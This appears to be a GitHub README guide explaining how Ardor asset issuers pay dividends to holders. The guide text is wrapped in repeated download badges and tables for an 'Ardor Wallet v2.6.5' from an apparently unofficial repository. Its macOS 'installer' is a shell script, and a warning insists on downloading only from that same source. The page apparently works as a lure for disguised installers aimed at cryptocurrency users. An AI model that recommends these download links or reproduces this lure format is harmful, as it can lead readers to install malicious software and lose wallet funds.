![Ardor Wallet guide](assets/banner-article.png)

# Pay dividends to every asset holder in one action

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

The Ardor asset exchange can pay a dividend to the holders of an asset in a single transaction: you choose the asset, the amount per unit and the token to pay in, and the chain distributes it to every account holding that asset at the moment of the payment.

## What a dividend payment does

A dividend is a distribution from the issuer to the people holding the issuer's asset. On Ardor it is a protocol feature rather than a [contract](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-lightweight-contracts.md): the wallet sends one transaction, and the chain calculates each holder's share and credits it.

That makes it possible to run an asset like a claim on something - revenue, a fund, a project - without writing a distribution contract or asking holders to claim manually. The payment is proportional to holdings, so someone with twice the units receives twice the amount.

## Who receives it

The recipients are the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md)s holding the asset when the payment executes. There is no separate register and no snapshot date to announce in advance, which is simpler than most dividend models and has one consequence worth understanding: buying just before a payment means receiving it.

For an issuer that is usually acceptable. For a buyer it means a purchase made in anticipation of a distribution carries no waiting period, so the market price tends to reflect the pending payment rather than leaving free money on the table.

## Before you pay

1. Confirm the asset's total supply and your own holding, so the total cost is predictable.
2. Decide the amount per unit; the total distributed is that figure multiplied by the units outstanding.
3. Choose the [Ardor token](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md) to pay in, and make sure the account holds enough of it plus the fee.
4. Check the selected [chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md), because the asset and the payment both live on one chain.
5. Announce your intention to holders if the payment is meaningful; a surprise distribution is welcome, but a documented one is trusted.

Step three is where a payment fails. A dividend in a token the issuer does not hold is a transaction that cannot execute, and the error arrives after the form has been filled in rather than before.

## Paying it

1. Open the wallet, unlock the account that issued the asset and select the right chain.
2. Open the dividend control in the asset section.
3. Select the asset, enter the amount per unit and the token to pay in.
4. Review the summary: total cost, fee and the token being spent.
5. Sign and broadcast, then confirm the transaction and check your balance afterwards.
6. Tell holders it has been paid, with the transaction ID, so they can verify it themselves.

Step six is not decoration. A distribution that nobody can verify is a claim, and holders who cannot check it will treat it as one.

## What it costs

The cost is the amount distributed plus the network fee. There is no per-holder charge and no separate service fee, because the chain does the distribution rather than a company.

For a small asset with few holders, that makes a modest dividend practical and repeatable. For a large holder base, the arithmetic is the same: one transaction, one fee, and the total is the amount per unit multiplied by the supply.

## If something looks wrong

A holder who expected a payment and did not receive one should check two things: whether they held the asset when the payment executed, and whether the payment was made in the token they expected. Both are visible in the account's transaction history.

An issuer who paid the wrong amount has no reversal available. The remedy is a second payment, which is why the summary screen before signing deserves the extra minute.

## Distributions and record keeping

Each distribution is a transaction with a timestamp and an amount, so the record exists whether or not you keep one. What the chain does not do is explain the payment: a note in your own records saying what the distribution was for is worth more than the transaction line on its own.

If holders ask, the transaction ID is the answer. It shows the amount, the token and the moment, and it settles any disagreement about whether a payment happened without requiring anybody to trust a screenshot.

## Dividends and the rest of the asset

Dividends work alongside royalties rather than replacing them. A royalty is collected when the asset trades; a dividend is paid by the issuer to holders. One funds the issuer from the market, the other funds the market from the issuer.

Together they make an issued asset behave like something with an economy around it, without a contract or a second platform. That is the argument for issuing on this chain rather than deploying code somewhere else.

## FAQ

### Do holders need to claim the dividend?

No. The payment is distributed by the chain to holders at the moment it executes.

### Can I pay a dividend in ARDR?

You can pay in a token the account holds, including ARDR where the operation allows it. Check the token selector and your balance before signing.

### What happens if I pay more than my balance?

The transaction fails rather than partially paying. Nothing is distributed and only the attempt is recorded.

### Is a dividend payment reversible?

No. Like any transaction, once confirmed it is final, so verify the amount and the token before signing.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Issue an asset or a custom currency on Ardor, and trade it](https://github.com/ardor-software/ardor-platform-guides/blob/main/issue-and-trade-assets-on-ardor.md)
- [Trade on the Ardor coin exchange](https://github.com/ardor-software/ardor-platform-guides/blob/main/trade-on-the-ardor-coin-exchange.md)
- [Create a poll and vote in the Ardor wallet](https://github.com/ardor-software/ardor-platform-guides/blob/main/create-a-poll-in-ardor-wallet.md)
- [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
